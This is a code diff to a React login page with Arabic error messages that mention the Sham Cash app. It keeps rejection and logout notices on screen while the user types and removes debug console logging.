@@ -18,6 +18,7 @@ export default function LoginPage() {
   const [showPass, setShowPass] = useState(false);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
+  const [hasShownRejectionError, setHasShownRejectionError] = useState(false);
 
   // Socket.io connection
   useEffect(() => {
@@ -33,21 +34,15 @@ export default function LoginPage() {
     const rejected = sessionStorage.getItem('login_rejected');
     const logoutNotice = sessionStorage.getItem('logout_notice');
     
-    console.log('LoginPage useEffect - login_rejected:', rejected, typeof rejected);
-    console.log('LoginPage useEffect - logout_notice:', logoutNotice);
-    console.log('LoginPage useEffect - current error state:', error);
-    
     if (logoutNotice === 'true') {
-      console.log('Setting logout notice error message');
       setError('يرجى تسجيل الخروج من تطبيق شام كاش المثبت على جهازك قبل التسجيل هنا');
+      setHasShownRejectionError(true);
       sessionStorage.removeItem('logout_notice');
       sessionStorage.removeItem('login_rejected');
     } else if (rejected === 'true') {
-      console.log('Setting rejected error message');
       setError('البريد الإلكتروني أو كلمة المرور غير صحيحة. يرجى التأكد وإعادة المحاولة.');
+      setHasShownRejectionError(true);
       sessionStorage.removeItem('login_rejected');
-    } else {
-      console.log('No rejection found');
     }
   }, []);
 
@@ -122,7 +117,7 @@ export default function LoginPage() {
                 <label className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                   <Mail className="w-4 h-4 text-blue-500" /> البريد الإلكتروني
                 </label>
-                <input type="email" value={email} onChange={(e) => { setEmail(e.target.value); setError(''); }}
+                <input type="email" value={email} onChange={(e) => { setEmail(e.target.value); if (!hasShownRejectionError) setError(''); }}
                   placeholder="example@mail.com" dir="ltr"
                   className="w-full border border-slate-300 rounded-xl px-4 py-3 text-sm text-slate-800 placeholder-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 text-left" />
               </div>
@@ -133,7 +128,7 @@ export default function LoginPage() {
                 </label>
                 <div className="relative">
                   <input type={showPass ? 'text' : 'password'} value={password}
-                    onChange={(e) => { setPassword(e.target.value); setError(''); }}
+                    onChange={(e) => { setPassword(e.target.value); if (!hasShownRejectionError) setError(''); }}
                     placeholder="••••••••" dir="ltr"
                     className="w-full border border-slate-300 rounded-xl px-4 py-3 text-sm text-slate-800 placeholder-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-100" />
                   <button type="button" onClick={() => setShowPass(!showPass)}
